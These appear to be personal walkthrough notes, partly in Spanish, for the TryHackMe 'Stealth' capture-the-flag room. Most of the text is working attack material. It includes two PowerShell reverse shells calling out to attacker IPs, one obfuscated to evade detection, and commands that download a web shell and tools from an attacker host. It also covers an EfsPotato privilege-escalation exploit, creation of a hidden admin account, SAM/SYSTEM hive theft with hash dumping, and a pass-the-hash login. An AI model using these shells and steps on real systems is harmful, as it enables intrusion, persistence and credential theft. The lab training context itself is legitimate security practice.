
https://happycamper84.medium.com/tryhackme-stealth-walkthrough-ea84fcf54b8b


https://sumanroy.gitbook.io/ctf-writeups/tryhackme-writeups/stealth-tryhackme-walkthrough-writeup#credits-to-my-friends-for-helping-me-research-on-this-room




https://systemweakness.com/stealth-tryhackme-write-up-aa684e97575a



nmap -p139,3389,445,47001,49664,49665,49666,49667,49668,49670,49671,5985,8000,8080,8443 -sV -sC -Pn -vvv -n 10.201.71.91 -oN fullScan.txt







PowerShell-reverse-shell

https://github.com/martinsohn/PowerShell-reverse-shell


[powershell-reverse-shell.ps1](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1)







do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.2', 4455)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()





sudo nc -lvnp 4455



----FORMA 2-------------------------------------------------------------------

type vulnerable.ps1


1. Copy the vulnerable.ps1 file and change the IP and the port as required
2. Upload the modified reverse shell
- Remove-Item log.txt
3. Delete the log.txt file in the Directory: C:\xampp\htdocs\uploads







###The vulnerable.ps1 file is a reverse shell, modifying the reverse shell file

###Using this as a reverse shell (sample.ps1)

Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('10.11.50.160',1234);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()

----------------------------------------------------------------

- USER

-- Administrator
-- evader


- DIRECTORIOS

C:\Users\evader\Desktop\

SHELL> type encodedflag

— — -BEGIN CERTIFICATE — — WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDovLzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5waHA=
— — -END CERTIFICATE — — -
SHELL>


https://www.base64decode.org/es/





You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php


You can get the flag by visiting the link http://10.201.71.91:8000/asdasdadasdjakjdnsdfsdfs.php




echo "WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDovLzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5waHA=" | base64 -d





http://10.201.71.91:8000/asdasdadasdjakjdnsdfsdfs.php



Flag: THM{1010_EVASION_LOCAL_USER}





-------------------------------------------------------------------------------


- C:\xampp\htdocs\uploads\



Get-Content C:\xampp\htdocs\uploads\vulnerable.ps1


sudo nc -lvnp 4455



Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('10.8.163.249',1234);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()










---------------------------------

Subir y ejecutar PrivescCheck.ps1:





SHELL> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SHELL>



https://github.com/itm4n/PrivescCheck

https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1



Upload ed execute PrivescCheck.ps1:

    iwr -uri "http://10.8.163.249:8000/PrivescCheck.ps1" -o priv.ps1

    curl "http://10.8.163.249:8000/PrivescCheck.ps1" -o priv.ps1


powershell.exe -ep bypass -c "..\priv.ps1; Invoke-PrivescCheck"


powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"




------------------------------------------------------------



https://github.com/flozz/p0wny-shell/blob/master/shell.php


 cd C:\xampp\htdocs\

iwr -uri "http://10.8.163.249:8000/shell.php" -o shell.php


curl "http://10.8.163.249:8000/shell.php" -o shell.php



    http://10.201.71.91:8080/shell.php





        

        ___                         ____      _          _ _        _  _   
 _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ 
| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|
| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|
| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  
|_|                         |___/  \____/                                  
                

            

evader@HostEvasion:C:\xampp\htdocs#  whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled





-----------------------------------------------------------------------



The user has SeImpersonatePrivilege enabled this can be used as a leverage for privilege escalation

Using Efspotato for privilege escalation 




https://github.com/zcgonvh/EfsPotato



 cd C:\xampp\htdocs\
 


curl "http://10.8.163.249:8000/EfsPotato.cs" -o efs.cs



C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efs.cs -nowarn:1691,618




evader@HostEvasion:C:\xampp\htdocs# dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\xampp\htdocs

07/31/2025  06:58 PM    <DIR>          .
07/31/2025  06:58 PM    <DIR>          ..
08/17/2023  05:09 AM             5,024 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2
07/16/2023  04:29 PM           213,642 background-image.jpg
07/11/2023  05:11 PM             9,711 background-image2.jpg
07/31/2025  06:57 PM            25,441 efs.cs
07/31/2025  06:58 PM            17,920 efs.exe
08/17/2023  05:11 AM             3,554 font.css
08/29/2023  09:55 AM             3,591 index.php
07/31/2025  06:47 PM            20,321 shell.php
07/31/2025  06:39 PM    <DIR>          uploads
               8 File(s)        299,204 bytes
               3 Dir(s)  13,595,394,048 bytes free








Es el ejecutable del exploit EfsPotato, el cual aprovecha una vulnerabilidad (CVE-2021-36942) para elevar privilegios locales a NT AUTHORITY\SYSTEM.



evader@HostEvasion:C:\xampp\htdocs# .\efs.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: HOSTEVASION\evader
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=1158390)
[+] Get Token: 872
[!] process with pid: 4816 created.
==============================
nt authority\system




Este comando ejecutado a través de efs.exe crea un usuario administrador local oculto o persistente, útil para mantener acceso al sistema sin necesidad de volver a explotar la vulnerabilidad.


.\efs.exe "cmd.exe /c net user user password@123 /add && net localgroup administrators user /add"




evader@HostEvasion:C:\xampp\htdocs# .\efs.exe "cmd.exe /c net user user password@123 /add && net localgroup administrators user /add"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: HOSTEVASION\evader
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=d8a210)
[+] Get Token: 848
[!] process with pid: 3780 created.
==============================
The command completed successfully.

The command completed successfully.




xfreerdp /u:user /p:password@123 /v:10.201.71.91 /dynamic-resolution




evil-winrm -i 10.201.71.91 -u Administrator -H 2dfe3378335d43f9764e581b856a662a


evil-winrm -i 10.201.71.91 -u user -p 'password@123'





-------------MANERA 2 HASHDUMP*-----------------------



 cd C:\xampp\htdocs\
 


curl "http://10.8.163.249:8000/backup.cs" -o backup.cs

C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe backup.cs



.\efs.exe backup.exe



evader@HostEvasion:C:\xampp\htdocs# .\efs.exe backup.exe
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: HOSTEVASION\evader
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=e129e0)
[+] Get Token: 860
[!] process with pid: 5596 created.
==============================
Backup completed successfully.
evader@HostEvasion:C:\xampp\htdocs#






evader@HostEvasion:C:\xampp\htdocs# dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\xampp\htdocs

07/31/2025  07:37 PM    <DIR>          .
07/31/2025  07:37 PM    <DIR>          ..
08/17/2023  05:09 AM             5,024 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2
07/16/2023  04:29 PM           213,642 background-image.jpg
07/11/2023  05:11 PM             9,711 background-image2.jpg
07/31/2025  07:36 PM               920 backup.cs
07/31/2025  07:37 PM             4,608 backup.exe
07/31/2025  06:57 PM            25,441 efs.cs
07/31/2025  06:58 PM            17,920 efs.exe
08/17/2023  05:11 AM             3,554 font.css
08/29/2023  09:55 AM             3,591 index.php
07/31/2025  07:37 PM            61,440 sam.bak
07/31/2025  06:47 PM            20,321 shell.php
07/31/2025  07:37 PM        18,505,728 system.bak
07/31/2025  06:39 PM    <DIR>          uploads
              12 File(s)     18,871,900 bytes
               3 Dir(s)  13,510,037,504 bytes free
evader@HostEvasion:C:\xampp\htdocs#





--MAQUINA KALI ATACANTE


wget http://10.201.71.91:8080/system.bak
wget http://10.201.71.91:8080/sam.bak


impacket-secretsdump -sam sam.bak -system system.bak local



impacket-secretsdump -sam sam.bak -system system.bak local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
evader:1022:aad3b435b51404eeaad3b435b51404ee:09de49072c2f43db1d7d8df21486bc73:::
user:1023:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0e95c074e3006fcf36e:::
[*] Cleaning up... 
                                                                            
┌──(kali㉿kali)-[~/Downloads/stealth]



evil-winrm -i 10.201.71.91 -u Administrator -H 2dfe3378335d43f9764e581b856a662a



Get-ChildItem C:\Users -Recurse | Select-String "THM{"
